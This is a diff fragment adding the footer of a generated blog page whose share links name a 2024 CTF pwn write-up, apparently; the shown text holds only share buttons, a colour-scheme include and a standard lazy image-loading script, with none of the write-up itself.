+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 2024%E4%BA%AC%E6%B4%A5%E5%86%80%E9%95%BF%E5%9F%8E%E6%9D%AFwp-pwn + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2Fd41a2c59.html + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/d41a2c59.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body>
+</html>
